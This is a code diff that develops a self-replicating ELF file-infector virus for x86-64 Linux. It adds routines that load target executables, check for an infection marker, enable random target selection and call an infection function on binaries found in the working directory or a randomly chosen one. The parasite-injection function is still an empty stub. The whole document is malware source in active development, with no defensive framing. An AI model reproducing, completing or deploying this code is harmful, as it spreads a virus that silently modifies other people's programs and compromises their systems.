@@ -85,7 +85,7 @@ _start()
 
 /*
  * Heap areas are created by passing a NULL initialized
- * pointer by reference.  Each heap area maxes out at 32k
+ * pointer by reference.  Each heap area maxes out at 4k
  * and it is up to the caller of vx_malloc() to keep track
  * of how much space has been used. For our uses this is
  * perfect.
@@ -146,6 +146,15 @@ char * full_path(char *exe, char *dir)
 
 void inject_parasite(size_t psize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
 {
+	int ofd;
+	unsigned int c;
+	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
+	unsigned char *mem = target->mem;
+	unsigned char *parasite = self->mem + ehdr_size;
+	char *host = target->path, *protected; 
+	elfbin_t newBin;
+	struct stat st;
+
 
 
 }
@@ -228,12 +237,12 @@ int load_self(elfbin_t *elf)
 		if (elf->phdr[i].p_type == PT_LOAD)
 			switch(!!elf->phdr[i].p_offset) {
 				case 0:
-					elf->textVaddr = phdr[i].p_vaddr;
-					elf->textSize = phdr[i].p_memsz;
+					elf->textVaddr = elf->phdr[i].p_vaddr;
+					elf->textSize = elf->phdr[i].p_memsz;
 					break;
 				case 1:
-					elf->dataVaddr = phdr[i].p_vaddr;
-					elf->dataSize = phdr[i].p_memsz;
+					elf->dataVaddr = elf->phdr[i].p_vaddr;
+					elf->dataSize = elf->phdr[i].p_memsz;
 					break;
 			}
 			
@@ -242,7 +251,38 @@ int load_self(elfbin_t *elf)
 	return 0;
 }
 
-	
+int load_target(const char *path, elfbin_t *elf)
+{
+	int i;
+	struct stat st;
+	int fd = _open(path, O_RDONLY);
+	if (fd < 0)
+		return -1;
+	if (_fstat(fd, &st) < 0)
+		return -1;
+	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+	if (elf->mem == MAP_FAILED)
+		return -1;
+	elf->ehdr = (Elf64_Ehdr *)elf->mem;
+	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
+	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
+	for (i = 0; i < elf->ehdr->e_phnum; i++) {
+		if (elf->phdr[i].p_type == PT_LOAD)
+                	switch(!!elf->phdr[i].p_offset) {
+                        	case 0:
+                                	elf->textVaddr = elf->phdr[i].p_vaddr;
+                                	elf->textSize = elf->phdr[i].p_memsz;
+                                	break;
+                               	case 1:
+                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
+                                	elf->dataSize = elf->phdr[i].p_memsz;
+                                	break;
+                        }
+        }
+	elf->size = st.st_size;
+	return 0;
+}
+
 /*
  * Must be ELF
  * Must be ET_EXEC
@@ -266,25 +306,18 @@ int check_criteria(char *filename)
 	_close(fd);
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
-	if (mem[0] != 0x7f && strncmp((char *)&mem[1], "ELF", 3)) {
-		ret = -1;
-		goto out;
-	}
+	if (mem[0] != 0x7f && strncmp((char *)&mem[1], "ELF", 3)) 
+		return -1;
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
-	if (magic == MAGIC_NUMBER) {//already infected? Then skip this file
-		ret = -1;
-		goto out;
-	}
+	if (magic == MAGIC_NUMBER) //already infected? Then skip this file
+		return -1;
+	if (ehdr->e_machine != EM_X86_64)
+		return -1;
 	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
 		if (phdr[i].p_type == PT_DYNAMIC)	
 			dynamic++;
-	if (!dynamic) {
-		ret = -1;
-		goto out;
-	}
-	
-out:
-	return ret;
+	if (!dynamic) 
+		return -1;
 
 }
 void do_main(void)
@@ -300,6 +333,7 @@ void do_main(void)
 	struct stat st;
 	mode_t mode;
 	uint32_t rnum;
+	elfbin_t self, target;
 
 	dir = _getuid() != 0 ? "." : randomly_select_dir();
 	
@@ -310,6 +344,8 @@ void do_main(void)
 		DEBUG_PRINT("open failed\n");
 		return;
 	}
+	
+	load_self(&self);
 	
 	for (;;) {
 		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
@@ -322,17 +358,17 @@ void do_main(void)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-#if 0
 			rnum = get_random_number(10);
-			DEBUG_PRINT("lucky number: %d\n", rnum);
 			if (rnum != LUCKY_NUMBER)
 				continue;
-#endif
 			if (d->d_name[0] == '.')
 				continue;
 			if (check_criteria(full_path(d->d_name, dir)) < 0)
 				continue;
 			DEBUG_PRINT("infecting file: %s\n", d->d_name);
+			
+			load_target(d->d_name, &target);
+			infect_elf_file(&self, &target);
 		}
 		
 	}
